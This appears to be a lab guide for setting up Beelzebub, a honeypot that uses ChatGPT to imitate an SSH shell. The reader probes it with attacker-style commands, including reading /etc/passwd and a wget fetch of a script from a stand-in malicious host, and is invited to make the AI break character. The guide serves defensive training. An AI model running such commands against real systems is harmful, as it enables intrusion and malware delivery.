# Beelzebub

# Ubuntu VM

Beelzebub is an advanced honeypot framework designed to provide a highly secure environment for detecting and analyzing cyber attacks. It offers a low code approach for easy implementation and uses AI to mimic the behavior of a high-interaction honeypot

### Get the ChatGPT Api Key
- Go to [ChatGPT](https://chatgpt.com/) and create an account if you don’t have one
- Make sure you have credits or a payment method at [Billing Setting](https://platform.openai.com/settings/organization/billing/overview)
- Go to [API Keys](https://platform.openai.com/api-keys) and create a new key
- Save this key as you will only see it once!

### Deployment
- Make sure you are into **~/ADCD/beelzebub/**

```bash
cd ~/ADCD/beelzebub/
```

```bash
nano docker-compose.yml
```
 - Put your key here at `OPEN_AI_SECRET_KEY: `

- Also comment the **Default SSH Mapping**(ssh 22 port) by putting a `#` anywhere before it in the same line

- Save and leave the editor with `Ctrl + X` + `Y` + `Enter`

```bash
cd configurations/services/
```
```bash
mv ./ssh-22.yaml ~
```
```bash
nano ./ssh-2222.yaml
```
 - Add your key with double quotes around it like `openAISecretKey: "your_api_key_here"`

 - Save and leave the editor with `Ctrl + X` + `Y` + `Enter`

```bash
cd ~/ADCD/beelzebub/
```
```bash
sudo docker-compose build
```
```bash
sudo docker-compose up -d
```

# Try it
Connect to it like this:

```bash
ssh -p 2222 root@127.0.0.1
``` 
- use password "**1234**"
- Try using any commands like **ls** or **id**

Everything you see is AI generated, and that's what an attacker would see

Cool, right?

- Try running suspicious commands an attacker would use
```bash
uname -a
```
```bash
cat /etc/passwd
```
```bash
wget http://malicious.example/malware.sh
```
```bash
id
```
Now exit the session by typing **exit** and hitting **enter** to export the logs

- Save Logs

```bash
sudo docker-compose logs > honeypot.log
```

- Stop **Beelzebub**

```bash
sudo docker stop beelzebub
```

- Read the Logs

```bash
cat honeypot.log
```

Take your time into analyzing the logs and seeing how they are being built

>Try to make ChatGPT break character, this method, like anything else in cybersecurity isn't flawless, but it surely tricks hackers and does its job, **to increase Attack Time**
